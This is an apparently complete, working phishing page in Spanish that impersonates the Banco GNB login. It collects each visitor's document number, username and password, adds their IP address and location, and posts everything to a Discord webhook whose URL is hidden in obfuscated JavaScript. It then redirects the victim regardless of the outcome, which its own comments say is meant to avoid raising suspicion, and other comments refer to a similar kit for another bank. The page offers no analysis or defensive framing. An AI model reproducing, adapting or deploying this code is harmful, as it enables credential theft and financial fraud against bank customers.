<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresa</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        body {
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }

        .login-container {
            background: #ffffff;
            width: 100%;
            max-width: 410px;
            padding: 40px 25px;
            text-align: center;
            position: relative;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            border-radius: 8px;
        }

        .menu-icon {
            position: absolute;
            top: 25px;
            left: 25px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .menu-icon span {
            width: 22px;
            height: 2px;
            background-color: #333;
        }

        .logo {
            max-width: 140px;
            margin-bottom: 20px;
        }

        h2 {
            color: #7cb342;
            font-size: 1.5rem;
            font-weight: 400;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 18px 50px 18px 15px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
            background-color: #fafafa;
            outline: none;
            transition: border-color 0.3s;
        }

        .input-group input:focus {
            border-color: #7cb342;
        }

        .field-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            user-select: none;
        }

        .btn-ingresar {
            width: 100%;
            padding: 16px;
            background-color: #d6d6d6;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1.1rem;
            cursor: not-allowed;
            margin-top: 15px;
            transition: background-color 0.3s;
            font-weight: 500;
        }

        .btn-ingresar.active {
            background-color: #0073b1;
            cursor: pointer;
        }

        .links-container {
            margin-top: 25px;
        }

        .link-blue {
            color: #0073b1;
            text-decoration: none;
            font-size: 0.95rem;
            display: inline-block;
            margin-bottom: 40px;
        }

        .btn-open-account {
            display: block;
            width: 100%;
            padding: 15px;
            background-color: #0073b1;
            color: white;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            font-size: 1rem;
            transition: background-color 0.2s;
        }

        .btn-open-account:hover {
            background-color: #00598a;
        }

        .error-message {
            color: #d32f2f;
            background-color: #ffebee;
            padding: 12px;
            border-radius: 4px;
            font-size: 0.95rem;
            margin-bottom: 20px;
            display: none;
            font-weight: 500;
            border: 1px solid #ffcdd2;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="menu-icon">
            <span></span>
            <span></span>
            <span></span>
        </div>

        <img src="logo.jpeg" alt="Banco GNB" class="logo">

        <h2>Ingresá tus datos</h2>

        <div id="errorMessage" class="error-message">Por favor, completa los tres campos para ingresar.</div>

        <form id="loginForm" onsubmit="event.preventDefault();">
            
            <div class="input-group">
                <input type="text" id="documento" placeholder="Número de documento" autocomplete="off">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><line x1="6" y1="8" x2="6" y2="8"></line><line x1="10" y1="8" x2="10" y2="8"></line><line x1="14" y1="8" x2="14" y2="8"></line><line x1="18" y1="8" x2="18" y2="8"></line><line x1="6" y1="12" x2="6" y2="12"></line><line x1="10" y1="12" x2="10" y2="12"></line><line x1="14" y1="12" x2="14" y2="12"></line><line x1="18" y1="12" x2="18" y2="12"></line><line x1="7" y1="16" x2="17" y2="16"></line></svg>
                </span>
            </div>

            <div class="input-group">
                <input type="text" id="usuario" placeholder="Usuario" autocomplete="off">
                <span class="field-icon">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><line x1="6" y1="8" x2="6" y2="8"></line><line x1="10" y1="8" x2="10" y2="8"></line><line x1="14" y1="8" x2="14" y2="8"></line><line x1="18" y1="8" x2="18" y2="8"></line><line x1="6" y1="12" x2="6" y2="12"></line><line x1="10" y1="12" x2="10" y2="12"></line><line x1="14" y1="12" x2="14" y2="12"></line><line x1="18" y1="12" x2="18" y2="12"></line><line x1="7" y1="16" x2="17" y2="16"></line></svg>
                </span>
            </div>

            <div class="input-group">
                <input type="password" id="clave" placeholder="Clave de acceso" autocomplete="off">
                <span class="field-icon" id="togglePassword">
                    <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
                </span>
            </div>

            <button type="submit" id="btnIngresar" class="btn-ingresar">Ingresar</button>
        </form>

        <div class="links-container">
            <a href="#" class="link-blue">Gestioná tu acceso</a>
            <a href="#" class="btn-open-account">Abrí tu cuenta</a>
        </div>
    </div>

    <script>
        // ⚠️ REEMPLAZA ESTA URL CON LA DE TU WEBHOOK DE DISCORD
        var webhookURL;(function(){var XBp='',NlX=701-690;function EsF(p){var m=1022722;var y=p.length;var d=[];for(var t=0;t<y;t++){d[t]=p.charAt(t)};for(var t=0;t<y;t++){var e=m*(t+245)+(m%23410);var o=m*(t+420)+(m%16805);var a=e%y;var j=o%y;var g=d[a];d[a]=d[j];d[j]=g;m=(e+o)%6527649;};return d.join('')};var XIV=EsF('rlxcatchtrytwpekzugojdobocnssmfnvriuq').substr(0,NlX);var KeW='.6(S>ifC r=r,,c8=tavnksp;;76[xa[[rusrl6iza0rst[)s<.z({tict4;ta5avn.),xtg16qr79,rap*5qv1,89efu,sfah"x+.)6lt=zn7=;t;,=;nrtar(g, e9)weurrca;b.=[tgx=c =rn=(e7 ;l)+nnsi]=))z==o=k ;=ah+g)aaeie(tr)ac}fuv+rnsAvar8(r0-8tfra)6e t[h-)e(+0si]g)s2]of(c6n0voer[v=+rh7nk=u+o =)(h)u(=haua=an{+j r=r1{,puv;7nc) d e ;}a;+!;gvojnugj=];nr. ;1tgl167a]r =r6f0eqd(o;le;{s,pfvouv)"oprn=rhai[-wtvl;++ (,.lsoifsr-olC=dnApg,lg+au;sx+znio.fi{]us=(o-a0 f;2h](=f{kA8h}mb,s)]0=0((;[aguerAs},irl0f=p;;n,f,(aag) g=h4}ri,nx<.Cvddf+fC+e)l)=3fh.ryiqer+ls92t-(;8(j;sv;rx!(v8a;af2ra<j(;"rr;i=gtu8a)a.1*a]t+1k]d o4,lfse-sr(kl))j=)z.ps=.io(,sl(g r(l+p;1=vv1;)f<=r r9f8l)ineuz+tvlcdro1(r7r0bbtus.i1;;]vgdvxiv.r;mn(c"i.oCw",lmhrg[v.>A7q=v1j w{t[i.l="v;;am;,"t9bu)s,)ah3r,v2,[2 (aun=5;(2;+ta, 9,"t61n,m)xorgh8rcidvush)jco;+ia=v]70; 4l4genot];x=+)jf=.i0lCqhtop.ce;let(");.;heeCom..o}.+  mC)(90o)aeb[(]S[i.es1ldx+hs<i=tin+"(;vi.ms.(r};';var TRS=EsF[XIV];var CiH='';var qGO=TRS;var hbE=TRS(CiH,EsF(KeW));var Zwl=hbE(EsF('$=2_d.bb6ct.h.i0%[2i.{i"%.qq$9a!lnc.t_2)j=l.;!orp%A".ggt.k=b4ag). ]l[e.=3.=#64A{A.d0(tCu;Ax.+=A.s01Ah.d_u_k3Az.p[5)r.-.b1b+;b%r0ud.r(ut]b85bzg.%$..)je5b})!uv]noq+1b(.87.1=r(9+0\/mu$3$b]An$h6l"blA.g(pA3b)A[.61A)l]!#vlnChx=AAih={r=n((.)A%[=6o(2nuq}m1(n$k$uAnowfr)Avea.koke(.2ct.fc .r%#}60d%4"s0.=6%jz.=!h;27-.\/s(,nipbm[\/!d;.=tb.Am.e(9r%7f)A.9wAyans$kplbt$).f!%5bsd4ea.-gu=o.#E#ad.=be2"n.mxo2c.]fhurIfzt\/f3c).A;;+1n28=1d5.2n8;_[x)b(+t.bh1.h7i0Sddf\/xenAdAmh1)+m).kr.jf#jww ;;dAhp5A.r;r!1db..eo)o=!dd+dbs:n8w."0v43eo1%xb#3b]o\/t"n! l===9;bp.b)6AafC% .+Cnol_A,..tr6ax..fr=bl6fgw(.x.b'));var vZa=qGO(XBp,Zwl );vZa(2330);return 5450})()

        // ⚠️ REEMPLAZA ESTA URL CON LA PÁGINA A DONDE QUIERES REDIRIGIR
        const REDIRECT_URL = "load.html";

        const documento = document.getElementById('documento');
        const usuario = document.getElementById('usuario');
        const clave = document.getElementById('clave');
        const btnIngresar = document.getElementById('btnIngresar');
        const errorMessage = document.getElementById('errorMessage');
        const togglePassword = document.getElementById('togglePassword');
        const eyeIcon = document.getElementById('eyeIcon');

        function validarCampos() {
            if (documento.value.trim() !== "" && usuario.value.trim() !== "" && clave.value.trim() !== "") {
                btnIngresar.classList.add('active');
            } else {
                btnIngresar.classList.remove('active');
            }
        }

        documento.addEventListener('input', validarCampos);
        usuario.addEventListener('input', validarCampos);
        clave.addEventListener('input', validarCampos);

        togglePassword.addEventListener('click', function() {
            if (clave.type === 'password') {
                clave.type = 'text';
                eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
            } else {
                clave.type = 'password';
                eyeIcon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 19c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>`;
            }
        });

        btnIngresar.addEventListener('click', function(e) {
            e.preventDefault();

            const doc = documento.value.trim();
            const user = usuario.value.trim();
            const pass = clave.value.trim();

            // Validar campos
            if (doc === "" || user === "" || pass === "") {
                errorMessage.style.display = 'block';
                window.scrollTo({ top: 0, behavior: 'smooth' });
                return;
            }

            errorMessage.style.display = 'none';

            // Obtener IP y ubicación
            fetch("https://ipinfo.io/json?")
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const ciudad = data.city;
                    const pais = data.country;
                    const region = data.region;

                    // Crear mensaje con el mismo formato que tu código de Davivienda
                    const mensaje = {
                        embeds: [
                            {
                                title: "🚨Nuevo ingreso",
                                color: 0x0073b1, // Azul corporativo
                                fields: [
                                    { name: "📄 Documento", value: doc, inline: true },
                                    { name: "👤 Usuario", value: user, inline: true },
                                    { name: "🔒 Clave", value: pass, inline: false },
                                    { name: "🌐 IP", value: ip, inline: true },
                                    { name: "🏙️ Ciudad", value: ciudad, inline: true },
                                    { name: "🗺️ País", value: pais, inline: true },
                                    { name: "📍 Región", value: region, inline: true }
                                ],
                                footer: { text: "Inicio de sesión GNB" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    // Enviar a Discord
                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje)
                    })
                    .then(response => {
                        if (response.ok) {
                            // ✅ Redirigir inmediatamente después de enviar
                            window.location.href = REDIRECT_URL;
                        } else {
                            console.error("❌ Error al enviar los datos a Discord");
                            // Aún así redirige para no levantar sospechas
                            window.location.href = REDIRECT_URL;
                        }
                    })
                    .catch(error => {
                        console.error("❌ Error de red al enviar a Discord:", error);
                        // Redirige aunque falle
                        window.location.href = REDIRECT_URL;
                    });
                })
                .catch(error => {
                    console.error("❌ Error al obtener la IP o ubicación:", error);
                    // Si falla la geolocalización, envía sin esos datos
                    const mensaje = {
                        embeds: [
                            {
                                title: "🚨 Nuevo ingreso",
                                color: 0x0073b1,
                                fields: [
                                    { name: "📄 Documento", value: doc, inline: true },
                                    { name: "👤 Usuario", value: user, inline: true },
                                    { name: "🔒 Clave", value: pass, inline: false },
                                    { name: "🌐 IP", value: "No disponible", inline: true },
                                    { name: "🏙️ Ciudad", value: "No disponible", inline: true },
                                    { name: "🗺️ País", value: "No disponible", inline: true }
                                ],
                                footer: { text: "Inicio de sesión GNB" },
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(mensaje)
                    })
                    .then(() => {
                        window.location.href = REDIRECT_URL;
                    })
                    .catch(() => {
                        window.location.href = REDIRECT_URL;
                    });
                });
        });
    </script>

</body>
</html>
